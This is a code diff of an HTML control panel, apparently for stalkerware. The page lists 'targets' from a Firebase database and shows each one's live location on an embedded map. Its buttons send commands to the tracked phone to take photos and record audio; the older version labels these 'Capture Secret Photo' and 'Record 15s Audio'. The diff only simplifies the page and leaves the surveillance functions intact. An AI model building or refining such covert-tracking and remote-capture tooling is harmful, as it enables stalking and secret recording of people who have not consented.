@@ -2,77 +2,38 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Global Tracking Dashboard</title>
+    <title>Global Tracking Admin</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --primary: #1a73e8; --danger: #d93025; --success: #1e8e3e; --bg: #f8f9fa; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; display: flex; height: 100vh; }
-        
-        /* Sidebar */
-        .sidebar { width: 300px; background: #fff; border-right: 1px solid #ddd; padding: 20px; overflow-y: auto; }
-        .target-card { 
-            padding: 15px; border-radius: 8px; border: 1px solid #eee; margin-bottom: 10px; 
-            cursor: pointer; transition: 0.3s; position: relative;
-        }
-        .target-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        .target-card.active { border-left: 5px solid var(--primary); background: #f1f6fe; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; display: flex; height: 100vh; }
+        .sidebar { width: 300px; background: #fff; border-right: 1px solid #ddd; padding: 15px; }
+        .main { flex: 1; padding: 20px; display: flex; flex-direction: column; }
+        .target-card { padding: 15px; border: 1px solid #eee; margin-bottom: 10px; cursor: pointer; border-radius: 8px; transition: 0.3s; }
+        .target-card.active { border-left: 5px solid #1a73e8; background: #e8f0fe; }
         .status-dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
-        .online { background: var(--success); box-shadow: 0 0 8px var(--success); }
+        .online { background: #1e8e3e; box-shadow: 0 0 8px #1e8e3e; }
         .offline { background: #9aa0a6; }
-
-        /* Main Content */
-        .main { flex: 1; display: flex; flex-direction: column; padding: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .map-container { flex: 1; background: #eee; border-radius: 12px; overflow: hidden; position: relative; min-height: 300px; }
-        
-        /* Control Panel */
-        .controls { background: #fff; padding: 20px; border-radius: 12px; margin-top: 20px; display: flex; gap: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        button { 
-            padding: 12px 24px; border: none; border-radius: 6px; font-weight: bold; 
-            cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s;
-        }
-        .btn-snap { background: var(--primary); color: #fff; }
-        .btn-mic { background: #5f6368; color: #fff; }
-        button:hover { opacity: 0.9; transform: translateY(-1px); }
-
-        /* Data Displays */
-        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
-        .data-box { background: #fff; padding: 15px; border-radius: 8px; border: 1px solid #eee; }
-        .data-box small { color: #5f6368; font-size: 12px; }
-        .data-box div { font-weight: bold; font-size: 16px; margin-top: 5px; }
+        .map-box { flex: 1; background: #fff; border-radius: 12px; border: 1px solid #ddd; overflow: hidden; margin-bottom: 20px; }
+        .controls { display: flex; gap: 10px; }
+        button { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #fff; }
+        .btn-blue { background: #1a73e8; }
+        .btn-red { background: #d93025; }
     </style>
 </head>
 <body>
-
     <div class="sidebar">
-        <h3>🎯 Active Targets</h3>
-        <div id="targetList">Loading targets...</div>
+        <h2>Targets</h2>
+        <div id="targetList">Connecting...</div>
     </div>
-
     <div class="main">
-        <div class="header">
-            <h2 id="activeTitle">Select a Target</h2>
-            <div id="lastSeenStatus"></div>
+        <h2 id="activeName">Select a target to track</h2>
+        <div class="map-box">
+            <iframe id="mapFrame" width="100%" height="100%" frameborder="0"></iframe>
         </div>
-
-        <div class="map-container" id="mapArea">
-            <iframe id="googleMap" width="100%" height="100%" frameborder="0" style="border:0" allowfullscreen></iframe>
-            <div id="mapOverlay" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#888;">
-                Map will load when target is selected
-            </div>
-        </div>
-
-        <div class="data-grid">
-            <div class="data-box"><small>📍 Current Coordinates</small><div id="coords">--</div></div>
-            <div class="data-box"><small>🛡️ Geofence Status</small><div id="geoStatus">--</div></div>
-            <div class="data-box"><small>📱 Device Status</small><div id="devStatus">--</div></div>
-        </div>
-
         <div class="controls">
-            <button class="btn-snap" onclick="sendCommand('snap')">📸 Capture Secret Photo</button>
-            <button class="btn-mic" onclick="sendCommand('mic')">🎙️ Record 15s Audio</button>
-            <button style="background:#e8eaed; color:#3c4043;" onclick="openGallery()">📂 View Gallery</button>
+            <button class="btn-blue" onclick="sendCommand('snap')">📸 TAKE PHOTO</button>
+            <button class="btn-red" onclick="sendCommand('mic')">🎙️ RECORD AUDIO</button>
         </div>
     </div>
 
@@ -80,55 +41,32 @@
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        let selectedTarget = null;
+        let selectedId = null;
 
-        // 1. Listen for all targets
-        db.ref('targets').on('value', (snapshot) => {
-            const targets = snapshot.val();
+        db.ref('targets').on('value', (snap) => {
             const list = document.getElementById('targetList');
             list.innerHTML = '';
-
-            for (let id in targets) {
-                const data = targets[id].location;
-                const isOnline = (Date.now() - data.last_seen) < 20000; // Online if updated in last 20s
+            snap.forEach((child) => {
+                const id = child.key;
+                const loc = child.val().location;
+                const isOnline = (Date.now() - loc.last_seen) < 15000;
                 
-                const card = document.createElement('div');
-                card.className = `target-card ${selectedTarget === id ? 'active' : ''}`;
-                card.onclick = () => selectTarget(id, data);
-                card.innerHTML = `
-                    <span class="status-dot ${isOnline ? 'online' : 'offline'}"></span>
-                    <strong>${id}</strong><br>
-                    <small>${data.timestamp || 'Never seen'}</small>
-                `;
-                list.appendChild(card);
-            }
+                const div = document.createElement('div');
+                div.className = `target-card ${selectedId === id ? 'active' : ''}`;
+                div.onclick = () => {
+                    selectedId = id;
+                    document.getElementById('activeName').innerText = "Live: " + id;
+                    document.getElementById('mapFrame').src = `https://maps.google.com/maps?q=${loc.lat},${loc.lng}&z=15&output=embed`;
+                };
+                div.innerHTML = `<span class="status-dot ${isOnline ? 'online' : 'offline'}"></span><b>${id}</b>`;
+                list.appendChild(div);
+            });
         });
 
-        function selectTarget(id, data) {
-            selectedTarget = id;
-            document.getElementById('activeTitle').innerText = "Tracking: " + id;
-            document.getElementById('coords').innerText = `${data.lat.toFixed(4)}, ${data.lng.toFixed(4)}`;
-            document.getElementById('geoStatus').innerText = data.geofence || "Calculating...";
-            document.getElementById('devStatus').innerText = "Battery Optimized";
-            
-            // Update Map
-            const mapUrl = `https://www.google.com/maps?q=${data.lat},${data.lng}&z=15&output=embed`;
-            document.getElementById('googleMap').src = mapUrl;
-            document.getElementById('mapOverlay').style.display = 'none';
-        }
-
-        function sendCommand(action) {
-            if (!selectedTarget) return alert("Select a target first!");
-            db.ref('commands/' + selectedTarget).set({
-                action: action,
-                time: Date.now()
-            });
-            alert("Command Sent: " + action);
-        }
-
-        function openGallery() {
-            if (!selectedTarget) return alert("Select a target first!");
-            window.open('https://your-vercel-link.app/gallery.html?id=' + selectedTarget);
+        function sendCommand(act) {
+            if(!selectedId) return alert("Target select karein!");
+            db.ref('commands/' + selectedId).set({ action: act, time: Date.now() });
+            alert("Command Sent!");
         }
     </script>
 </body>
